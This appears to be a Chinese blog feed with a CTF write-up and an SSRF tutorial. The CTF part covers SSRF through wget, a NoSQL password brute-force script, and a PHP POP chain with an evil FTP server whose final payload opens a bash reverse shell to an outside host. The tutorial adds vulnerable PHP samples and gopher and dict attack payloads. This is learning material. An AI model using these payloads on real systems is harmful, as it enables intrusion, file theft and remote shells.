regexp.MustCompile(&quot;127.0.0.1|0.0.0.0|06433|0x|0177|localhost|ffff&quot;)    if re.MatchString(url.Url) &#123;        c.JSON(403, gin.H&#123;&quot;msg&quot;: &quot;Url Forbidden&quot;&#125;)        return    &#125;        client :&#x3D; &amp;http.Client&#123;Timeout: 2 * time.Second&#125;    resp, err :&#x3D; client.Get(url.Url)    if err !&#x3D; nil &#123;        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)        return    &#125;    defer resp.Body.Close()    var buffer [512]byte    result :&#x3D; bytes.NewBuffer(nil)    for &#123;        n, err :&#x3D; resp.Body.Read(buffer[0:])        result.Write(buffer[0:n])        if err !&#x3D; nil &amp;&amp; err &#x3D;&#x3D; io.EOF &#123;            break        &#125; else if err !&#x3D; nil &#123;            c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)            return        &#125;    &#125;    c.JSON(http.StatusOK, gin.H&#123;&quot;data&quot;: result.String()&#125;)&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512232424874.png" alt="image-20220512232424874"></p><p>这块一看就像为了防止ssrf才写出来的，（虽然我没看出来ssrf漏洞在哪，在我看来这还是利用了wget</p><p>但是我们可以用<code>[::]</code>绕过对127.0.0.1的限制然后访问内网</p><p>并且wget路由可以用来发送请求，那么就可以传入恶意的参数来获取服务器上文件并且外带出来，最终的payload（注意post发包改为application/json格式）</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;[::]:8080&#x2F;wget?argv&#x3D;-e+http_proxy&#x3D;http:&#x2F;&#x2F;ip:port&amp;argv&#x3D;--method&#x3D;POST&amp;argv&#x3D;--body-file&#x3D;&#x2F;flag&amp;argv&#x3D;http:&#x2F;&#x2F;ip:port&quot;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512232841863.png" alt="image-20220512232841863"></p><p>小tips：</p><p>这个payload里<code>-e &quot;http_proxy=porxyhost:port&quot;</code>这部分是利用<code>wget -e &quot;http_proxy=porxyhost:port&quot; www.baidu.com</code>的形式获得代理设置的命令，但实际上根本用不到，因为argv参数从第二个开始取</p><p>顺带提一下如果是curl命令就要用<code>curl -x proxyhost:port www.baidu.com</code>这种形式</p><h3 id="三-nosql注入"><a href="#三-nosql注入" class="headerlink" title="三.nosql注入"></a>三.nosql注入</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513122251311.png" alt="image-20220513122251311"></p><p>这里存在nosql注入</p><p>所以可以根据这个获取admin的密码，脚本如下：</p><p>脚本中使用//将该行之后的代码进行注释，并且通过补全代码使得代码完整<br>代码中判断是否成功用的是Pretend字符串，根据源码，如果用户名名称和密码判断不正确，就会返回含有Pretend的字符串</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;47.117.125.220:8081&#x2F;login&quot;#自行修改headers &#x3D; &#123;    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;strings &#x3D; &quot;1234567890abcdefghijklmnopqrstuvwxyz&quot;res &#x3D; &quot;&quot;#res长度从0开始for i in range(len(res) + 1, 40):    if len(res) &#x3D;&#x3D; i - 1:        for c in strings:            data &#x3D; &#123;                #注意这个substr用的是-号，是反向读取密码的，反向逐个读取密码，然后对比                &quot;username&quot;: &quot;admin&#39;&amp;&amp;this.password.substr(-&quot; + str(i) + &quot;)&#x3D;&#x3D;&#39;&quot; + str(c + res) + &quot;&#39;) &#123;return true;&#125;&#125;)&#x2F;&#x2F;&quot;,                &quot;password&quot;: &quot;123456&quot;            &#125;            r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, data&#x3D;data)            if &quot;Pretend&quot; in r.text:                res &#x3D; c + res                print(&quot;[+] &quot; + res)                break    else:        print(&quot;[-] Failed&quot;)        break</code></pre><p>不过没啥用，就算是admin登录了也没flag</p><h2 id="eaaasyphp"><a href="#eaaasyphp" class="headerlink" title="eaaasyphp"></a>eaaasyphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Check &#123;    public static $str1 &#x3D; false;    public static $str2 &#x3D; false;&#125;class Esle &#123;    public function __wakeup()    &#123;        Check::$str1 &#x3D; true;    &#125;&#125;class Hint &#123;    public function __wakeup()&#123;        $this-&gt;hint &#x3D; &quot;no hint&quot;;    &#125;    public function __destruct()&#123;        if(!$this-&gt;hint)&#123;            $this-&gt;hint &#x3D; &quot;phpinfo&quot;;            ($this-&gt;hint)();        &#125;      &#125;&#125;class Bunny &#123;    public function __toString()    &#123;        if (Check::$str2) &#123;            if(!$this-&gt;data)&#123;                $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;];            &#125;            file_put_contents($this-&gt;filename, $this-&gt;data);        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;    &#125;&#125;class Welcome &#123;    public function __invoke()    &#123;        Check::$str2 &#x3D; true;        return &quot;Welcome&quot; . $this-&gt;username;    &#125;&#125;class Bypass &#123;    public function __destruct()    &#123;        if (Check::$str1) &#123;            ($this-&gt;str4)();        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;    &#125;&#125;if (isset($_GET[&#39;code&#39;])) &#123;    unserialize($_GET[&#39;code&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;</code></pre><p>这里有file_put_contents，文件名和内容都可控，可以试试写马，但是这里做了权限控制，写不了</p><p>然后看到有hint类，里面能访问phpinfo尝试去反序列化执行这个类，绕过wakeup我们采用常用的修改方式</p><pre class="language-txt" data-language="txt"><code class="language-txt">O:4:&quot;Hint&quot;:0:&#123;&#125;&#x3D;&gt;O:4:&quot;Hint&quot;:1:&#123;&#125;</code></pre><p>发现并没有执行，因为wakeup的绕过在高版本被修复了，这里官方给了一个很有意思的绕过<a href="https://bugs.php.net/bug.php?id=81151">https://bugs.php.net/bug.php?id=81151</a></p><p>将O改成C就能成功绕过，访问phpinfo，改成负数好像也可以</p><p>除此之外还可以利用bypass类来访问phpinfo</p><pre class="language-php" data-language="php"><code class="language-php">class Bypass &#123;    public function __construct()    &#123;        $this-&gt;test &#x3D; new Esle();        $this-&gt;str4 &#x3D; &#39;phpinfo&#39;;    &#125;&#125;$a &#x3D; new Bypass();echo serialize($a);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513124945406.png" alt="image-20220513124945406"></p><p>在phpinfo里发现</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513125309445.png" alt="image-20220513125309445"></p><p>那应该就是利用ftp(文件传输协议)的被动模式打php-fpm9000端口了</p><h3 id="FTP的被动模式打php-fpm"><a href="#FTP的被动模式打php-fpm" class="headerlink" title="FTP的被动模式打php-fpm"></a>FTP的被动模式打php-fpm</h3><p>FTP 协议的被动模式：客户端试图从FTP服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的IP和端口上，我们可以指定到127.0.0.1:9000，这样就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF</p><p>原理：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513131104286.png" alt="image-20220513131104286"></p><p>这里要先在vps上搭一个恶意的ftp服务</p><pre class="language-python" data-language="python"><code class="language-python"># evil_ftp.pyimport sockets &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#39;0.0.0.0&#39;, 5002))s.listen(1)conn, addr &#x3D; s.accept()conn.send(b&#39;220 welcome\n&#39;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#39;331 Please specify the password.\n&#39;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#39;230 Login successful.\n&#39;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#39;200 Switching to Binary mode.\n&#39;)#Size &#x2F;conn.send(b&#39;550 Could not get the file size.\n&#39;)#EPSV (1)conn.send(b&#39;150 ok\n&#39;)#PASVconn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#39;) #STOR &#x2F; (2)conn.send(b&#39;150 Permission denied.\n&#39;)#QUITconn.send(b&#39;221 Goodbye.\n&#39;)conn.close()</code></pre><p>然后利用gopherus生成打fastcgi的payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513135948923.png" alt="image-20220513135948923"></p><p>我们只要9000/_后边的部分</p><p>最后就是构造pop链调用file_put_contents</p><p>这里有几个魔术方法</p><pre class="language-txt" data-language="txt"><code class="language-txt">__wakeup():当调用unserialize时触发__toString():当类被当作字符串时调用__invoke():当把类当作函数处理时调用</code></pre><p>pop链</p><pre class="language-php" data-language="php"><code class="language-php">class Check &#123;    public static $str1 &#x3D; ture;    public static $str2 &#x3D; &#39;phpinfo&#39;;&#125;class Esle &#123;    public function __wakeup()    &#123;        Check::$str1 &#x3D; true;    &#125;&#125;class Hint &#123;    public function __wakeup()&#123;        $this-&gt;hint &#x3D; &quot;no hint&quot;;    &#125;    public function __destruct()&#123;        if(!$this-&gt;hint)&#123;            $this-&gt;hint &#x3D; &quot;phpinfo&quot;;            ($this-&gt;hint)();        &#125;    &#125;&#125;class Bunny &#123;    public function __construct()&#123;        $this-&gt;filename &#x3D;&#39;ftp:&#x2F;&#x2F;aaa@ip:5002&#x2F;123&#39;;#这里的端口号要和ftp的服务里的端口号一样    &#125;    public function __toString(): string    &#123;        if (Check::$str2) &#123;            if(!$this-&gt;data)&#123;                $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;];            &#125;            file_put_contents($this-&gt;filename, $this-&gt;data);        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;        return &#39;1&#39;;    &#125;&#125;class Welcome &#123;    public function __construct()&#123;        $this-&gt;username &#x3D; new Bunny();    &#125;    public function __invoke(): string    &#123;        Check::$str2 &#x3D; true;        return &quot;Welcome&quot; . $this-&gt;username;    &#125;&#125;class Bypass &#123;    public function __construct()    &#123;        $this -&gt; test &#x3D; new Esle();        $this -&gt;str4 &#x3D; new Welcome();    &#125;    public function __destruct()    &#123;        if (Check::$str1) &#123;            ($this-&gt;str4)();        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;    &#125;&#125;$a &#x3D; new Bypass();echo urlencode(serialize($a));</code></pre><p>最终构造的payload为</p><pre class="language-txt" data-language="txt"><code class="language-txt">code&#x3D;O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A4%3A%22test%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A33%3A%22ftp%3A%2F%2Faaa%40117.XX.XXX.XXX%3A5002%2F123%22%3B%7D%7D%7D&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;117.XX.XXX.XXX&#x2F;5001%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513135416159.png" alt="image-20220513135416159"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/2022/04/26/ssrf/"/>
      <url>/2022/04/26/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="首先，什么是ssrf？"><a href="#首先，什么是ssrf？" class="headerlink" title="首先，什么是ssrf？"></a><strong>首先，什么是ssrf？</strong></h3><p> SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源的一种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问限制的主机。</p><p> SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。</p><p> 请求地址被恶意利用的话，如下图所示，就能够以服务端的身份向任意地址发起请求，如果是一台存在远程代码执行漏洞的内网机器，借助 SSRF 漏洞就可以获取该内网机器的控制权。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/v2-6dc1016bfa442bbdf844b3ecf4f15d93_720w.jpg" alt="img"></p><h3 id="ssrf的危害"><a href="#ssrf的危害" class="headerlink" title="ssrf的危害"></a>ssrf的危害</h3><p>内网探测：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。</p><p>窃取本地和内网敏感数据：访问和下载内网的敏感数据，利用 File 协议访问服务器本地文件。</p><p>攻击服务器本地或内网应用：利用发现的漏洞进一步发起攻击利用。</p><p>跳板攻击：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以隐藏自己真实 IP。</p><p>绕过安全防御：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加速、安全宝等等）防御。</p><p>拒绝服务攻击：请求超大文件，保持链接 Keep-Alive Always。</p><p>在服务器上搭个环境，看到页面查到的ip是服务器的，而不是本机的ip</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427140646342.png" alt="image-20220427140646342"></p><h3 id="相关危险函数"><a href="#相关危险函数" class="headerlink" title="相关危险函数"></a>相关危险函数</h3><p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。</p><ul><li>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</li></ul><pre class="language-none"><code class="language-none">&lt;?php$url &#x3D; $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><ul><li>readfile()：输出一个文件的内容。</li><li>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</li></ul><pre class="language-none"><code class="language-none">&lt;?php function GetFile($host,$port,$link) &#123;     $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);       if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \n&quot;;     &#125; else &#123;         $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;;         $out .&#x3D; &quot;Host: $host\r\n&quot;;         $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;         $out .&#x3D; &quot;\r\n&quot;;         fwrite($fp, $out);         $contents&#x3D;&#39;&#39;;         while (!feof($fp)) &#123;             $contents.&#x3D; fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;</code></pre><ul><li>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</li></ul><pre class="language-php" data-language="php"><code class="language-php">&lt;?php if (isset($_POST[&#39;url&#39;]))&#123;    $link &#x3D; $_POST[&#39;url&#39;];    $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项    $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器    curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源</code></pre><ul><li>fopen()：打开一个文件文件或者 URL。</li><li>……</li></ul><p>一些tips</p><pre class="language-none"><code class="language-none">1.一般情况下PHP不会开启fopen的gopher wrapper2.file_get_contents的gopher协议不能URL编码3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转，6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</code></pre><h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul><li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li><li>http/s协议：探测内网主机存活</li></ul><p>贴一下国光师傅的博客</p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p><h1 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h1><p>file协议主要用于访问本地计算机中的文件，命令格式为：</p><pre class="language-text" data-language="text"><code class="language-text">file:&#x2F;&#x2F;文件路径</code></pre><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>使用file协议进行的任意文件读取算是ssrf最简单的利用方式了<br>首先先写一段有ssrf漏洞的代码，命名为ssrf.php并部署到服务器上。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    highlight_file(&#39;shell.php&#39;);    $url &#x3D; $_GET[&#39;url&#39;];    echo($url);    $curlobj &#x3D; curl_init($url);    echo curl_exec($curlobj);?&gt;</code></pre><p>然后就可以利用file协议进行读取文件操作了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427171515601.png" alt="image-20220427171515601"></p><p>另外，如果是宝塔建的站，记得复现的时候把这个防跨站攻击关了，不然什么也读不到</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427171629925.png" alt="image-20220427171629925"></p><h3 id="file协议与http协议的区别"><a href="#file协议与http协议的区别" class="headerlink" title="file协议与http协议的区别"></a>file协议与http协议的区别</h3><ul><li>file协议主要用于读取服务器本地文件，访问的是本地的静态资源</li><li>http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</li><li>http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</li><li>file对应的类似http的协议是ftp协议（文件传输协议）</li><li>file不能跨域</li></ul><h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><h3 id="协议简介"><a href="#协议简介" class="headerlink" title="协议简介"></a>协议简介</h3><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。<br>它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。<br>gopher 协议使用tcp 可靠连接。</p><p>gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为<strong>可以使用gopher发送各种格式的请求包，这样就可以解决漏洞点不在GET参数的问题</strong>了。 </p><h3 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h3><pre class="language-none"><code class="language-none">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</code></pre><ul><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li><li><code>&lt;gopher-path&gt;</code>其中<code>&lt;gopher-path&gt;</code>格式可以是如下其中的一种<code>&lt;/gopher-path&gt;</code>,当然，这部分也可以省略</li></ul><pre class="language-none"><code class="language-none">&lt;gophertype&gt;&lt;selector&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher+_string&gt;</code></pre><p>整个<code>&lt;gopher-path&gt;</code>部分可以省略，这时候<code>\</code>也可以省略<code>&lt;gophertype&gt;</code>为默认的1。<br><code>&lt;gophertype&gt;</code>是一个单字符用来表示url 资源的类型，在常用的安全测试中发现不管这个字符是什么都不影响，只要有就行了。<br><code>&lt;selector&gt;</code>个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码，但如果直接把wireshark 中ascii 编码的数据直接进行url 编码然后丢到gopher 协议里跑会出错，得在wireshark 里先换成hex 编码的原始数据后再每两个字符的加上<code>%</code>，通过对比发现直接url 编码的话会少了<code>%0d</code>回车字符。<br><code>&lt;search&gt;</code>用于向gopher 搜索引擎提交搜索数据，和<code>&lt;selector&gt;</code>之间用<code>%09</code>隔开。<br><code>&lt;gopher+_string&gt;</code>是获取gopher+ 项所需的信息，gopher+ 是gopher 协议的升级版。</p><p>先试一下</p><p>vps上监听5001端口，然后在另一台上利用gopher发送请求</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426162607969.png" alt="image-20220426162607969"></p><p>发现虽然发送的请求是abcd但是接收的只有bcd</p><p>这是因为用一个单字符表示了<code>&lt;gophertype&gt;</code>部分</p><h3 id="构造get请求"><a href="#构造get请求" class="headerlink" title="构造get请求"></a>构造get请求</h3><p>网页代码为</p><pre class="language-none"><code class="language-none">&lt;?php    echo &quot;Hello &quot;.$_REQUEST[&quot;name&quot;].&quot;\n&quot;?&gt;</code></pre><p>get的请求方式就是</p><pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426163357450.png" alt="image-20220426163357450"></p><h3 id="构造post请求"><a href="#构造post请求" class="headerlink" title="构造post请求"></a>构造post请求</h3><pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A</code></pre><p>与get不同的地方就是要加上Content-Type和Content-Length</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426163600192.png" alt="image-20220426163600192"></p><h3 id="Gopher与get-shell"><a href="#Gopher与get-shell" class="headerlink" title="Gopher与get shell"></a>Gopher与get shell</h3><p>首先准备一个有ssrf漏洞的代码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426164049486.png" alt="image-20220426164049486"></p><p>先试一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142628212.png" alt="image-20220427142628212"></p><p>那我们能不能用这个代码来读到我们test.php里的内容呢</p><pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A</code></pre><p>构造这样的payload，但是发现并没有回显出test.php里的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142655184.png" alt="image-20220427142655184"></p><p>这里是因为在PHP在接收到参数后会做一次URL的解码，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。</p><pre class="language-none"><code class="language-none">curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher%3A%2F%2Fip%3A80%2F_GET%2520%2Fssrf%2Ftest%2Ftest.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520ip%250d%250A</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427142748085.png" alt="image-20220427142748085"></p><p>成功利用</p><p>剩下的部分搭环境比较麻烦，而且还有的涉及到Java的框架了，不想搭了（瘫，直接贴链接了</p><p><a href="https://xz.aliyun.com/t/6993">https://xz.aliyun.com/t/6993</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)</a></p><h1 id="DICT协议"><a href="#DICT协议" class="headerlink" title="DICT协议"></a>DICT协议</h1><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。</p><p><a href="https://wzyboy.im/post/1237.html">使用 dictd 搭建 DICT 字典服务器 | wzyboy’s blog</a></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><pre class="language-sh" data-language="sh"><code class="language-sh">dict:&#x2F;&#x2F;127.0.0.1:端口&#x2F;</code></pre><p>用nc在测试机监听，然后利用ssrf漏洞测试一下dict协议发送字符串info，看看接收方会收到什么：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427190812101.png" alt="image-20220427190812101"></p><p>可以看到一共收到了三行数据，第一行是版本号，第二行是我们发送的数据，第三行是自动添加的QUIT。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427190738841.png" alt="image-20220427190738841"></p><p>成功看到了mysql数据库的版本号</p><p>可以利用dict进行指纹识别</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183350712.png" alt="image-20220429183350712"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183432301.png" alt="image-20220429183432301"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429183500425.png" alt="image-20220429183500425"></p><h1 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h1><p>这部分不是很熟，直接上参考文章了</p><p><a href="https://www.modb.pro/db/163739">https://www.modb.pro/db/163739</a></p><h3 id="什么是FastCGI"><a href="#什么是FastCGI" class="headerlink" title="什么是FastCGI"></a>什么是FastCGI</h3><p>在网站架构中，Web Server（如Nginx）只是内容的分发者</p><p>当客户端请求的是index.php，根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_3920a5e6-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p><p>当Web Server收到 index.php 这个请求后，会启动对应的<strong>CGI 程序</strong>，也就是PHP解析器</p><p>接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以<strong>CGI规范的格式</strong>返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程</p><ul><li><strong>CGI：</strong> 是 Web Server 与 Web Application 之间 <strong>数据交换的一种协议</strong></li><li><strong>FastCGI：</strong> 同 CGI，是一种通信协议，对比 CGI 提升了5倍以上性能</li><li><strong>PHP-CGI：</strong> 是 PHP（Web Application）对 Web Server 提供的 CGI 协议的接口程序</li><li><strong>PHP-FPM：</strong> 是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能的任务管理功能</li></ul><p>PHP默认提供了很多种SAPI（服务器端应用编程端口），常见的提供给apache和nginx的<code>php5_module</code>、<code>CGI</code>、<code>FastCGI</code>，给IIS的<code>ISAPI</code>，以及Shell的<code>CLI</code></p><p>经过不断的技术升级，目前搭建高性能的PHP Web服务器，最佳的方式是<strong>Apache/Nginx</strong> + <strong>FastCGI</strong> + **PHP-FPM(PHP-CGI)**方式</p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_396ea818-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p><p>Web 服务器启动时载入<strong>FastCGI进程管理器</strong>（PHP-CGI或者PHP-FPM)</p><ol><li>FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程，并等待来自 Web Server 的连接</li><li>Web 服务器与 FastCGI 进程管理器进行 <strong>Socket 通信</strong>，选择一个CGI 